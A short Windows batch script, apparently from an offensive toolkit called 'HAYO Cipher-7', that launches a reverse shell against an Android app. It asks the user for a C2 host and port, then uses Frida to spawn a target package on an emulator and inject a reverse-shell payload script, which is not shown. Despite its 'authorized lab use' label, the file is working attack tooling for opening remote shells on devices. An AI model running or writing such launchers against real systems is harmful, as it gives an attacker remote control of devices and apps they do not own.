@echo off
REM ============================================================
REM  HAYO Cipher-7 — Reverse Shell launcher (authorized lab use)
REM  Usage:  RUN-REVERSE-SHELL.bat  com.target.package   (or run and type it)
REM  Targets the EMULATOR only (safe while a real phone is attached).
REM ============================================================
title HAYO Reverse Shell
cd /d "%~dp0"
...
set /p RHOST="Reverse host (C2): "
set /p RPORT="Reverse port: "
...
echo [*] Injecting reverse-shell payload into %PKG% on %DEV% (C2 %RHOST%:%RPORT%) ...
frida -D %DEV% -f %PKG% -l payload_reverse_shell.js
pause
